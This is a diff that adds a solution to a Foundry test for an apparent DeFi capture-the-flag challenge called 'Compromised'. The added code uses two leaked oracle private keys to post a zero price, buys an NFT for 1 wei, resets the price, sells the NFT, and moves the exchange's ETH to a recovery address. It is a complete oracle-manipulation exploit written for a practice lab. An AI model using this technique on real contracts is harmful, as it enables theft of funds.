@@ -76,6 +76,40 @@ contract CompromisedChallenge is Test {
      */
     function test_compromised() public checkSolved {
         
+        uint256 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        uint256 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+
+        address source1 = vm.addr(privateKey1);
+        address source2 = vm.addr(privateKey2);
+
+        vm.startPrank(source1);
+        oracle.postPrice("DVNFT", 0);
+        vm.stopPrank();
+
+        vm.startPrank(source2);
+        oracle.postPrice("DVNFT", 0);
+        vm.stopPrank();
+
+        uint256 price = oracle.getMedianPrice("DVNFT");
+
+        vm.startPrank(player);
+        uint256 id = exchange.buyOne{value: 1 wei}();
+        vm.stopPrank();
+
+        vm.startPrank(source1);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.stopPrank();
+
+        vm.startPrank(source2);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.stopPrank();
+
+        vm.startPrank(player);
+        nft.approve(address(exchange), id);
+        exchange.sellOne(id);
+        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+
     }
 
     /**
